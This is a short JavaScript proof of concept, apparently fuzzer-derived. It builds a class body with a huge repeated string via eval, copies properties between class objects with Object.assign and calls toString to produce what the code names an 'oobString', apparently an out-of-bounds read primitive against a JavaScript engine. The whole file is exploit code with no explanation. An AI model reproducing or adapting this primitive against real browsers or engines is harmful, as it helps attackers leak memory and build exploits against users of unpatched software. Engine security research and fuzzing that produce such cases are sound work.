function getHiddenValue() {
    var obj = {};
    var oob = "/re/";
    const v10 = oob.replace("re", ("*").repeat(1048576));
    oob = v10;
    var str = ("class x extends Array{" + v10) + "}";
    var fun = eval(str);
    Object.assign(obj, fun);
    return obj;
}
function makeOobString() {
    var hiddenValue = getHiddenValue();
    var str = "class x extends Array{}";
    var fun = eval(str);
    try {
        Object.assign(fun, hiddenValue);
    } catch(e30) {
    }
    let v30;
    try {
        v30 = fun.toString();
    } catch(e34) {
    }
    var oobString = v30;
    return oobString;
}
var oobString = makeOobString();
